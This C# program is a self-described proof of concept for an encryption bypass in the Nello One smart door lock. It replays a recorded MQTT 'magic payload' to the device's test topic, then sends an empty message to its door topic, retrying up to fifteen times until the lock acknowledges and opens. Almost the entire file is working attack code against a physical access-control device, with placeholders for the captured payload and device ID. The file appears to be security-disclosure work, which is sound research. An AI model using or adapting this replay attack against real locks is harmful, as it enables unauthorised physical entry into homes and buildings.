using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using NelloOneTest.Services;
using System;
using System.Threading.Tasks;

namespace NelloOneTest
{
    /// <summary>
    /// Copyright (C) 2020 Lars D. Feicho
    /// 
    /// Proof of concept
    /// Nello (nello.io) open door without cloud (security issue)
    ///
    /// This program is free software: you can redistribute it and/or modify
    /// it under the terms of the GNU General Public License as published by
    /// the Free Software Foundation, either version 3 of the License, or
    /// (at your option) any later version.
    /// This program is distributed in the hope that it will be useful,
    /// but WITHOUT ANY WARRANTY; without even the implied warranty of
    /// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
    /// GNU General Public License for more details.
    /// You should have received a copy of the GNU General Public License
    /// along with this program.If not, see<http://www.gnu.org/licenses/>.
    /// </summary>
    class Program
    {
        // Change this magic payload to your device specific payload
        private static string testTopicMagicPayload = "INSERT_YOUR_RECORDED_TEST_MESSAGE_HERE\n";
        private static string doorTopicMagicPayload = "\"\"";

        // Change this id to your nello device id
        private static string nelloDeviceId = "INSERT_YOUR_DEVICE_ID_2_HERE";
        private static bool isExpectedResponseReceived = false;

        static async Task Main(string[] args)
        {
            var serviceCollection = new ServiceCollection();
            ConfigureServices(serviceCollection);
            var serviceProvider = serviceCollection.BuildServiceProvider();
            var logger = serviceProvider.GetService<ILogger<Program>>();
            var mqttService = serviceProvider.GetService<IMqttService>();
            mqttService.AckOnlineSequenceReceived += MqttService_AckOnlineSequenceReceived;

            try
            {
                Console.WriteLine("Local network nello usage");
                Console.WriteLine("Encryption bypass PoC");
                Console.WriteLine("---------------------------");

                Console.WriteLine("Connecting to MQTT broker..");
                await mqttService.ConnectToBrokerAsync();
                Console.WriteLine("Connected");

                bool isProcessing = true;
                while (isProcessing)
                {
                    Console.WriteLine("Enter 'open' to open your door, or 'exit' to quit the programm.");

                    var inputCommand = Console.ReadLine();
                    if (!string.IsNullOrEmpty(inputCommand))
                    {
                        if (string.Equals("open", inputCommand.ToLower()))
                        {
                            isExpectedResponseReceived = false;
                            int counter = 0;

                            // We try a max send sequence of 15 times
                            // In avg. nello opened my lock on the third try
                            while (!isExpectedResponseReceived && counter < 15)
                            {
                                // Send magic payload to test topic

                                await mqttService.SendMessageAsync(string.Format("/nello_one/{0}/test/", nelloDeviceId), testTopicMagicPayload);

                                // Delay - in my case - necessary
                                // Give nello some time to prepare for the next message
                                // Maybe you need to increase your delay value

                                await Task.Delay(500);

                                // Send magic payload to door topic

                                await mqttService.SendMessageAsync(string.Format("/nello_one/{0}/door/", nelloDeviceId), doorTopicMagicPayload);
                                Console.WriteLine("Commands sent");

                                // Delay included to have some time to react to nello responses (MqttService_AckOnlineSequenceReceived)
                                await Task.Delay(1000);
                                counter += 1;
                            }

                            if(!isExpectedResponseReceived || counter >= 15)
                            {
                                Console.WriteLine("Please make sure that you've used your 'testTopicMagicPayload' value and check if your lock is already unlocked.");
                            }
                        }
                        else if (string.Equals("exit", inputCommand.ToLower()))
                        {
                            isProcessing = false;
                        }
                    }
                }
            }
            catch(Exception ex)
            {
                logger.LogError("Main error:\n" + ex.ToString());
            }
        }

        private static void MqttService_AckOnlineSequenceReceived(object sender, EventArgs e)
        {
            isExpectedResponseReceived = true;
        }

        private static void ConfigureServices(IServiceCollection services)
        {
            services.AddSingleton<IMqttService, NelloMqttService>();
            services.AddLogging(configure => configure.AddConsole())
                    .AddTransient<Program>();
        }
    }
}



 